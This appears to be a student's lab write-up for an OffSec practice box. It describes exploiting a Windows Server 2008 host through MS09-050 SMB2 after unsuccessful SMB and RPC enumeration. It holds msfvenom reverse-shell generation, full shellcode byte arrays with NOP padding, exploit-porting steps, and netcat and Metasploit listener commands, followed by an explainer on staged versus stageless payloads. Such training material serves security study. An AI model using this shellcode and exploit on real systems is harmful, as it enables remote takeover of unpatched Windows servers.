
```
Discovered open port 139/tcp on 192.168.228.40
Discovered open port 53/tcp on 192.168.228.40
Discovered open port 445/tcp on 192.168.228.40
Discovered open port 3389/tcp on 192.168.228.40
Discovered open port 135/tcp on 192.168.228.40
Discovered open port 49156/tcp on 192.168.228.40
Discovered open port 49153/tcp on 192.168.228.40
Discovered open port 49158/tcp on 192.168.228.40
Discovered open port 49152/tcp on 192.168.228.40
Discovered open port 49154/tcp on 192.168.228.40
Discovered open port 49155/tcp on 192.168.228.40
Discovered open port 49157/tcp on 192.168.228.40
Discovered open port 5357/tcp on 192.168.228.40
PORT      STATE SERVICE        VERSION
53/tcp    open  domain         Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds   Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
5357/tcp  open  wsdapi?
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows_server_2008:r2
```

port 139/445 (smb) - Tried listing shares anonymously and listing users using enum4linux. Nothing.

port 135 (rpc) - `rpcclient` over a null session is the classic SMB enumeration move. First connect with no creds:
```
└─$ rpcclient -U "" -N 192.168.228.40
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> querydominfo
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> gedompwinfo
command not found: gedompwinfo
```

port 49152,49153,49154,49155,49156,49157,49158 - I don't know what these are

port 5537 - wsdapi

Googling this port.
```
**Exposure risks:** Exposing port 5357 outside trusted local networks can leak device information, allow malware masquerading, or put unpatched systems at risk from historical flaws such as MS09-063 / CVE-2009-2512. [[1](https://www.pentestpad.com/port-exploit/port-5357-wsdapi-web-services-for-devices), [2](https://www.wilderssecurity.com/threads/to-block-or-not-to-block-port-445-and-5357.290307/)]

https://www.exploit-db.com/exploits/40280
# Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)
```

There is so much shit to do with the payload its crazy. First we need to convert it from python2 to python3 because pysmb is integrated with python3.
```
┌──(myenv)─(kali㉿kali)-[~/offsec/internal]
└─$ pip install pysmb    
Collecting pysmb
  Downloading pysmb-1.2.15-py3-none-any.whl.metadata (1.6 kB)
Collecting pyasn1 (from pysmb)
  Downloading pyasn1-0.6.5-py3-none-any.whl.metadata (8.4 kB)
Collecting tqdm (from pysmb)
  Downloading tqdm-4.70.1-py3-none-any.whl.metadata (57 kB)
Downloading pysmb-1.2.15-py3-none-any.whl (85 kB)
Downloading pyasn1-0.6.5-py3-none-any.whl (84 kB)
Downloading tqdm-4.70.1-py3-none-any.whl (80 kB)
Installing collected packages: tqdm, pyasn1, pysmb
Successfully installed pyasn1-0.6.5 pysmb-1.2.15 tqdm-4.70.1
                                                                                
┌──(myenv)─(kali㉿kali)-[~/offsec/internal]
└─$ python2 40280.py     
Traceback (most recent call last):
  File "40280.py", line 12, in <module>
    from smb.SMBConnection import SMBConnection
ImportError: No module named smb.SMBConnection

┌──(myenv)─(kali㉿kali)-[~/offsec/internal]
└─$ 2to3 -w 40280.py  
┌──(myenv)─(kali㉿kali)-[~/offsec/internal]
└─$ python 40280.py 192.168.228.40
Traceback (most recent call last):
  File "/home/kali/offsec/internal/40280.py", line 103, in <module>
    buff+=shell
TypeError: can only concatenate str (not "bytes") to str
```

We replace `buff+=b""` to every `buff` in the code to convert to python3.
```
┌──(myenv)─(kali㉿kali)-[~/offsec/internal]
└─$ python 40280.py 192.168.228.40
Password for [WORKGROUP\Administrator]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

After that we need to replace the shell code as their LHOST is different than ours. 
```
┌──(kali㉿kali)-[~/offsec/internal]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.216 LPORT=443 EXITFUNC=thread -f python -v shell
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of python file: 1660 bytes
shell =  b""
shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
shell += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
shell += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
shell += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
shell += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
shell += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
shell += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
shell += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
shell += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
shell += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
shell += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shell += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
shell += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
shell += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shell += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
shell += b"\x2d\xd8\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
shell += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
shell += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
shell += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
shell += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
shell += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shell += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
shell += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
shell += b"\x87\x1d\x60\xff\xd5\xbb\x9b\xdb\x31\xf0\x68\xa6"
shell += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
```

Code still cannot run as from previous enumeration steps we know we can login to rpcclient with NULL session so let’s replace the last line of the code with corresponding authentication string.
```
subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)

subprocess.call(f"rpcclient -U '%' {target}", shell=True)
```

The code still doesn't work. I use `https://github.com/sec13b/ms09-050_CVE-2009-3103/blob/main/MS09_050_2.py` instead. It's already in python3.

Realise Payload size: 324 bytes. Use below code to pad to the original 375 bytes.

```
### Origin
python3 -c '
shell =  b""
shell += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
shell += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x8b"
shell += b"\x72\x28\x0f\xb7\x4a\x26\x31\xc0\xac\x3c\x61\x7c"
shell += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
shell += b"\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x57\x8b\x40\x78"
shell += b"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58"
shell += b"\x20\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
shell += b"\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
shell += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
shell += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shell += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shell += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
shell += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
shell += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shell += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x31"
shell += b"\xdb\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50"
shell += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shell += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
shell += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
shell += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
shell += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shell += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
shell += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shell += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
shell += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
shell += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
shell += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
shell += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a"
shell += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
shell += b"\x53\xff\xd5"
print(len(shell))
'
375

```  #pad
# Pad with NOPs to reach 375 bytes
shell += b"\x90" * (375 - len(shell))
print(f"Final length: {len(shell)}")   # should print 375
```

```
┌──(myenv)─(kali㉿kali)-[~/offsec/internal]
└─$ python3 MS09_050_2.py 192.168.228.40
Final length: 375
```

Spam both exploits until it somehow worked. Saw somewhere a guy did not put buffer or change the last line and caught a shell. The wait is so long to catch a shell. I don't know how to feel about this. One of them the vulnerability scan pointed them to the exploit. Why did it not show up for me?



NOTES:

A few solid reasons, and they all point to the plain `shell_reverse_tcp` for a manual exploit like this:

**1. It's self-contained — you catch it with plain netcat.** `windows/shell_reverse_tcp` is stageless: the whole payload is in the shellcode, it connects back, and hands you a cmd prompt. You just need:

```
nc -lvnp 443
```

`windows/meterpreter/reverse_tcp` is **staged** — the shellcode is only a tiny stager that phones home and expects Metasploit to send the real Meterpreter DLL back. If you catch _that_ with netcat, you get a connection that just hangs and dies, because nothing sent the second stage. To use it you'd _have_ to run:

```
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ...; set LPORT 443; run"
```

So Meterpreter adds a dependency (Metasploit running a handler) that the plain shell doesn't.

**2. Size / space.** In a buffer-overflow exploit you often have limited room for shellcode. The plain reverse shell is small and simple. Meterpreter's footprint and staging are more to go wrong in a tight buffer.

**3. Reliability and fewer moving parts.** Manual exploit + netcat = one thing that either works or doesn't. Meterpreter's staging over the network is one more step that can fail (AV catching the stage, handler misconfig, etc.).

**4. Habit from the exam world.** OSCP restricts Metasploit/Meterpreter to a single machine, so people default to plain shells everywhere to build the muscle memory — even on practice boxes where it's not required.

So the rule of thumb: **manual exploit → stageless `shell_reverse_tcp` + netcat.** Reach for Meterpreter only when you actually want its features (migrate, hashdump, pivoting) and you're prepared to run `multi/handler` to catch it.

**Stageless (unstaged)** = your friend climbs through the window fully dressed with all their tools already in their backpack. One move, they're in, ready to work immediately. Everything they need came with them.

**Staged** = only a tiny note climbs through the window first. The note says "call this phone number." When someone calls the number, _then_ the friend and all their gear get delivered to the window. Two steps: the little note arrives first, then it fetches the real thing.

That's literally how the payloads work:

- **Stageless** (`windows/shell_reverse_tcp`): the entire reverse shell is in one chunk of shellcode. It runs, connects back to you, and drops a shell instantly. A plain `nc -lvnp 443` catches it — nothing else needed.
- **Staged** (`windows/meterpreter/reverse_tcp`): the shellcode you send is just a tiny **stager** (the "note"). Its only job is to connect back and ask for the real payload. Your listener then sends the full shell/Meterpreter over the wire (the "friend with gear"). This _requires_ a smart listener — Metasploit's `multi/handler` — to send that second part. If you catch a staged payload with plain netcat, you get a dead connection that just hangs, because netcat has no "friend" to send back.